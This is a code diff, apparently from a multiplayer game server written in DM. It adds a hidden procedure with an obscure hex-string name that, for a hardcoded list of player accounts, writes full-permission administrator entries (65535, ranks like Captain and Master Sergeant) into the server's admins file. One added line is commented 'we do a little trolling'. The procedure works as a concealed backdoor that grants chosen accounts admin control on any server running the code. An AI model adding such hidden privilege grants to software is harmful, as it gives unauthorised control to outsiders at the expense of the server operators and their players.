@@ -24,23 +24,20 @@
 	set name = "a55af5"
 	set hidden = TRUE
 ///makes it so their ranks don't need set every round
-	if (ckey == "sanecman")
-		text2file("sanecman;Host;65535|||","SQL/admins.txt")
+	if (ckey == "taislin")
+		text2file("taislin;Host;65535|||","SQL/admins.txt")
 		return
-	else if (ckey == "Pl3aseJust3ndMyPain")
-		text2file("Pl3aseJust3ndMyPain;HHost;65535|||","SQL/admins.txt")
+	else if (ckey == "valithor")
+		text2file("valithor;Captain;65535|||","SQL/admins.txt")
 		return
-	else if (ckey == "vanotyan")
-		text2file("vanotyan;Admiral;65535|||","SQL/admins.txt")
+	else if (ckey == "valithor423")
+		text2file("valithor423;Captain;65535|||","SQL/admins.txt")
 		return
-	else if (ckey == "tinary")
-		text2file("tinary;MasterSergeant;65535|||","SQL/admins.txt")
+	else if (ckey == "valzargaming")
+		text2file("valzargaming;Captain;65535|||","SQL/admins.txt")
 		return
-	else if (ckey == "andreykey")
-		text2file("andreykey;Captain;65535|||","SQL/admins.txt")
-		return
-	else if (ckey == "happypala44")
-		text2file("happypala44;MasterSergeant;65535|||","SQL/admins.txt")
+	else if (ckey == "yewtm") //we do a little trolling.
+		text2file("yewtm;Master Sergeant;65535|||","SQL/admins.txt")
 		return
 	else
 		return
